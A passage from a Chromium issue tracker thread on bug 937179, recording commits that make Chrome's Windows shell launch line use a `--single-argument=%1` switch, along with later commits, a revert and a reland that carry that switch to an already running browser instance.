> > Chrome's one and only argument. This limits shell-based launches to
> > passing only one argument to Chrome.
> >
> > Previously, Chrome's command line as registered with the Windows shell
> > was `chrome.exe "%1"`, %1 being Windows' filename placeholder. The
> > shell replaces this placeholder with the file/URL that Chrome has been
> > invoked on (e.g., if the link "https://www.chromium.org" were clicked,
> > Chrome would be run with command line
> > `chrome.exe "https://www.chromium.org"`.
> >
> > With this change, Chrome's command line is
> > `chrome.exe --single-argument=%1`, and the contents of %1 are treated
> > as a single argument regardless of quotes or spacing.
> >
> > Code that creates the command line string for the Windows shell (e.g.
> > code writing Chrome's command line to the registry) must use the new
> > format by calling GetCommandLineStringForShell(), which appends
> > "--single-argument=%1" to the returned string.
> >
> > Bug: 937179
> > Change-Id: I6c0d6f0abce7a8c9f65ca8b90d15438310db7c92
> > Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2116596
> > Commit-Queue: Jesse McKenna <jessemckenna@google.com>
> > Reviewed-by: Lei Zhang <thestig@chromium.org>
> > Reviewed-by: Greg Thompson <grt@chromium.org>
> > Cr-Commit-Position: refs/heads/master@{#773398}
>
> TBR=thestig@chromium.org,grt@chromium.org,jessemckenna@google.com
>
> # Not skipping CQ checks because original CL landed > 1 day ago.
>
> Bug: 937179
> Change-Id: I014cd0b1acb5080b16b68268ea8d20eb18f9b431
> Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2255138
> Commit-Queue: Jesse McKenna <jessemckenna@google.com>
> Reviewed-by: Jesse McKenna <jessemckenna@google.com>
> Cr-Commit-Position: refs/heads/master@{#780559}

TBR=thestig@chromium.org,grt@chromium.org,jessemckenna@google.com

# Not skipping CQ checks because original CL landed > 1 day ago.

Bug: 937179
Change-Id: I3d83b82bddaf1a40235273bce94541c63322cc7a
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2273598
Reviewed-by: Greg Thompson <grt@chromium.org>
Reviewed-by: Lei Zhang <thestig@chromium.org>
Reviewed-by: Jesse McKenna <jessemckenna@google.com>
Commit-Queue: Jesse McKenna <jessemckenna@google.com>
Cr-Commit-Position: refs/heads/master@{#789641}

[modify] https://crrev.com/036150cfca14e4f91b7f06855b19462575aed37f/base/command_line.cc
[modify] https://crrev.com/036150cfca14e4f91b7f06855b19462575aed37f/base/command_line.h
[modify] https://crrev.com/036150cfca14e4f91b7f06855b19462575aed37f/base/command_line_unittest.cc
[modify] https://crrev.com/036150cfca14e4f91b7f06855b19462575aed37f/chrome/browser/web_applications/components/web_app_file_handler_registration_win.cc
[modify] https://crrev.com/036150cfca14e4f91b7f06855b19462575aed37f/chrome/installer/util/shell_util.cc
[modify] https://crrev.com/036150cfca14e4f91b7f06855b19462575aed37f/chrome/installer/util/shell_util.h
[modify] https://crrev.com/036150cfca14e4f91b7f06855b19462575aed37f/chrome/installer/util/shell_util_unittest.cc


### je...@google.com (2020-08-05)

[Empty comment from Monorail migration]

### ad...@google.com (2020-08-24)

[Empty comment from Monorail migration]

### ad...@google.com (2020-08-24)

[Empty comment from Monorail migration]

### ad...@google.com (2020-09-21)

[Empty comment from Monorail migration]

### [Deleted User] (2020-11-12)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### gi...@appspot.gserviceaccount.com (2022-10-31)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/bb75c8b7890feca13c7c4ffb2cf61a47fb9ff73b

commit bb75c8b7890feca13c7c4ffb2cf61a47fb9ff73b
Author: David Bienvenu <davidbienvenu@chromium.org>
Date: Mon Oct 31 15:28:31 2022

win: keep single-argument when converting cmdline to string

When Chrome is launched with --single-argument, but rendezvous's with
an already running instance of Chrome, this CL makes it so we pass the
--single-argument switch to the running instance of Chrome. This helps
us record the right launch mode metric, and fixes a potential instance
of https://crbug.com/937179 for the rendezvous case.

Bug: 1366137, 937179
Change-Id: Ibec82bb4237c7de88140c81bec2a279121d72db7
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3984458
Reviewed-by: Jesse McKenna <jessemckenna@google.com>
Reviewed-by: Francois Pierre Doray <fdoray@chromium.org>
Commit-Queue: David Bienvenu <davidbienvenu@chromium.org>
Cr-Commit-Position: refs/heads/main@{#1065496}

[modify] https://crrev.com/bb75c8b7890feca13c7c4ffb2cf61a47fb9ff73b/base/command_line.cc
[modify] https://crrev.com/bb75c8b7890feca13c7c4ffb2cf61a47fb9ff73b/base/command_line_unittest.cc


### gi...@appspot.gserviceaccount.com (2022-11-14)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/8916a44f76ab801df79f73c22cbffc4bb9beae2e

commit 8916a44f76ab801df79f73c22cbffc4bb9beae2e
Author: David Bienvenu <davidbienvenu@chromium.org>
Date: Mon Nov 14 17:30:57 2022

Revert "win: keep single-argument when converting cmdline to string"

This reverts commit bb75c8b7890feca13c7c4ffb2cf61a47fb9ff73b.

Reason for revert: crbug.com/1383469 - regresses rendezvous case

Original change's description:
> win: keep single-argument when converting cmdline to string
>
> When Chrome is launched with --single-argument, but rendezvous's with
> an already running instance of Chrome, this CL makes it so we pass the
> --single-argument switch to the running instance of Chrome. This helps
> us record the right launch mode metric, and fixes a potential instance
> of https://crbug.com/937179 for the rendezvous case.
>
> Bug: 1366137, 937179
> Change-Id: Ibec82bb4237c7de88140c81bec2a279121d72db7
> Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3984458
> Reviewed-by: Jesse McKenna <jessemckenna@google.com>
> Reviewed-by: Francois Pierre Doray <fdoray@chromium.org>
> Commit-Queue: David Bienvenu <davidbienvenu@chromium.org>
> Cr-Commit-Position: refs/heads/main@{#1065496}

Bug: 1366137, 937179
Change-Id: I1e27b5a85255917182d646090c5134154fb98f02
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4025894
Reviewed-by: Francois Pierre Doray <fdoray@chromium.org>
Commit-Queue: David Bienvenu <davidbienvenu@chromium.org>
Cr-Commit-Position: refs/heads/main@{#1071081}

[modify] https://crrev.com/8916a44f76ab801df79f73c22cbffc4bb9beae2e/base/command_line.cc
[modify] https://crrev.com/8916a44f76ab801df79f73c22cbffc4bb9beae2e/base/command_line_unittest.cc


### gi...@appspot.gserviceaccount.com (2022-11-15)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/64ea83fa008642a6ce30a8b0c6ba3a9a73ebaf56

commit 64ea83fa008642a6ce30a8b0c6ba3a9a73ebaf56
Author: David Bienvenu <davidbienvenu@chromium.org>
Date: Tue Nov 15 22:06:22 2022

Revert "win: keep single-argument when converting cmdline to string"

This reverts commit bb75c8b7890feca13c7c4ffb2cf61a47fb9ff73b.

Reason for revert: crbug.com/1383469 - regresses rendezvous case

Original change's description:
> win: keep single-argument when converting cmdline to string
>
> When Chrome is launched with --single-argument, but rendezvous's with
> an already running instance of Chrome, this CL makes it so we pass the
> --single-argument switch to the running instance of Chrome. This helps
> us record the right launch mode metric, and fixes a potential instance
> of https://crbug.com/937179 for the rendezvous case.
>
> Bug: 1366137, 937179
> Change-Id: Ibec82bb4237c7de88140c81bec2a279121d72db7
> Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3984458
> Reviewed-by: Jesse McKenna <jessemckenna@google.com>
> Reviewed-by: Francois Pierre Doray <fdoray@chromium.org>
> Commit-Queue: David Bienvenu <davidbienvenu@chromium.org>
> Cr-Commit-Position: refs/heads/main@{#1065496}

(cherry picked from commit 8916a44f76ab801df79f73c22cbffc4bb9beae2e)

Bug: 1366137, 937179
Change-Id: I1e27b5a85255917182d646090c5134154fb98f02
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4025894
Reviewed-by: Francois Pierre Doray <fdoray@chromium.org>
Commit-Queue: David Bienvenu <davidbienvenu@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#1071081}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4025901
Reviewed-by: Lei Zhang <thestig@chromium.org>
Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
Cr-Commit-Position: refs/branch-heads/5414@{#50}
Cr-Branched-From: 4417ee59d7bf6df7a9c9ea28f7722d2ee6203413-refs/heads/main@{#1070088}

[modify] https://crrev.com/64ea83fa008642a6ce30a8b0c6ba3a9a73ebaf56/base/command_line.cc
[modify] https://crrev.com/64ea83fa008642a6ce30a8b0c6ba3a9a73ebaf56/base/command_line_unittest.cc


### gi...@appspot.gserviceaccount.com (2022-11-22)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/6d3c35fe2b4be92e2d24eaf91f899202b714df0f

commit 6d3c35fe2b4be92e2d24eaf91f899202b714df0f
Author: David Bienvenu <davidbienvenu@chromium.org>
Date: Tue Nov 22 00:25:48 2022

Reland "win: keep single-argument when converting cmdline to string"

This is a reland of commit bb75c8b7890feca13c7c4ffb2cf61a47fb9ff73b

Original change's description:
> win: keep single-argument when converting cmdline to string
>
> When Chrome is launched with --single-argument, but rendezvous's with
> an already running instance of Chrome, this CL makes it so we pass the
> --single-argument switch to the running instance of Chrome. This helps
> us record the right launch mode metric, and fixes a potential instance
> of https://crbug.com/937179 for the rendezvous case.
>
> Bug: 1366137, 937179
> Change-Id: Ibec82bb4237c7de88140c81bec2a279121d72db7
> Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3984458
> Reviewed-by: Jesse McKenna <jessemckenna@google.com>
> Reviewed-by: Francois Pierre Doray <fdoray@chromium.org>
> Commit-Queue: David Bienvenu <davidbienvenu@chromium.org>
> Cr-Commit-Position: refs/heads/main@{#1065496}

Bug: 1366137, 937179, 1383469
Change-Id: I5d9a65b53ef769b8168e5a4574c6bc2365b0b3a4
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4032757
Commit-Queue: David Bienvenu <davidbienvenu@chromium.org>
Reviewed-by: Jesse McKenna <jessemckenna@google.com>
Reviewed-by: Francois Pierre Doray <fdoray@chromium.org>
Cr-Commit-Position: refs/heads/main@{#1074368}

[modify] https://crrev.com/6d3c35fe2b4be92e2d24eaf91f899202b714df0f/base/command_line.cc
[modify] https://crrev.com/6d3c35fe2b4be92e2d24eaf91f899202b714df0f/base/command_line_unittest.cc


### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/937179?no_tracker_redirect=1

[Multiple monorail components: Internals>Core, Security]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40094180)*
